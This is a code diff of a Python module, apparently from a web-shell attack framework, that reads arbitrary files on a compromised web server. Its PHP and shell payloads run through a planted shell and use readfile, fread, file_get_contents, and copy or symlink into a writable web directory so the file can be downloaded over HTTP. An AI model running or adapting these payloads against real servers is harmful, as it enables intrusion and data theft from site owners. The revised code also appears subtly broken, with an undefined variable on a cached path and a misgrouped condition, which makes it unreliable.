@@ -9,17 +9,19 @@ classname = 'Read'
     
 class Read(Module):
     '''Read file outside the web root using different tecniques
-    files.read <path>
+    file.read <path>
     '''
     
-    vectors_order = { 'shell.php' : [ "readfile()", "file_get_contents()", "copy()", "symlink()"], 
+    vectors_order = { 'shell.php' : [ "symlink()", "readfile()", "file_get_contents()", "fread()",  "copy()", "file()"], 
                       'shell.sh'  : [ "cat" ]
                      }
     
     vectors = { 'shell.php' : { "readfile()"       : "readfile('%s');",
+                               "file()"             : "print(implode('', file('%s')));",
+                               "fread()"            : "$f='%s'; print(fread(fopen($f,'r'),filesize($f)));",
                                 "file_get_contents()"     : "print(file_get_contents('%s'));",
                                 "copy()"       : "@copy('compress.zlib://%s','%s/file.txt') && file_exists('%s/file.txt') && print(1);",
-                                "symlink()"     : "@symlink('%s','%s/file.txt') && file_exists('%s/file.txt') && print(1);"
+                                "symlink()"     : "@symlink('%s','%s/file.txt'); file_exists('%s/file.txt') && print(1);"
                                 },
                 'shell.sh' : {
                                 "cat" : "cat %s"
@@ -37,11 +39,9 @@ class Read(Module):
         self.writable_dir = None
         
         
-    def __slack_probe(self, path):
+    def __slack_probe(self, remote_path):
         
-        doc_root = self.modhandler.load('system.info').run('document_root')
-        writable_dir = self.modhandler.load('find.perms').run('first', 'dir', 'w', doc_root)
-        self.writable_dir = writable_dir
+
         
         for interpreter in self.vectors:
             for vector in self.vectors_order[interpreter]:
@@ -50,13 +50,18 @@ class Read(Module):
                     payload = self.vectors[interpreter][vector]
                     
                     if payload.count( '%s' ) == 1:
-                        payload = payload % path
+                        payload = payload % remote_path
                         
-                    if payload.count( '%s' ) == 3:
-                        payload = payload % (path, writable_dir, writable_dir)
+                    if (vector.startswith('copy') or vector.startswith('symlink')) and payload.count( '%s' ) == 3:
                         
-                    response = self.modhandler.load(interpreter).run(payload)
+                        if not self.writable_dir:
+                            doc_root = self.modhandler.load('system.info').run('document_root')
+                            writable_dir = self.modhandler.load('find.perms').run('first', 'dir', 'w', doc_root)
+                            self.writable_dir = writable_dir
+                        
+                        payload = payload % (remote_path, writable_dir, writable_dir)
                     
+                    response = self.modhandler.load(interpreter).run(payload)
                     
                     if response:
                         
@@ -64,31 +69,32 @@ class Read(Module):
                         self.interpreter = interpreter
                         self.vector = vector
                         
-                        return self.__print_response(response)
+                        return self.__process_response(response)
 
-        raise ModuleException("files.read",  "File read probing failed")       
+        raise ModuleException("file.read",  "File read probing failed")       
      
-    def __print_response(self, response):
-
-        if self.vector.startswith('copy') or self.vector.startswith('symlink'):
+  
+    def __process_response(self,response):
+      
+        if self.vector.startswith('copy') or self.vector.startswith('symlink') and response == '1':
             print "[file.read] File copied/linked to '%s/file.txt'. Try to download it via HTTP." % self.writable_dir
         else:
             print "[file.read] File read using method '%s'" % (self.vector)
-            
-        return response        
+            return response
         
      
-    def run(self, src_path):
+    def run(self, remote_path):
         
         if not self.payload or not self.interpreter:
-            return self.__slack_probe(src_path)
+            return self.__slack_probe(remote_path)
         else:
             response = self.modhandler.load(self.interpreter).run(self.payload)
             
             if response:
-                return self.__print_response(response)
+                
+                return self.__process_response(response)
 
-            raise ModuleException("files.read",  "File read failed")
+            raise ModuleException("file.read",  "File read failed")
         
         
             
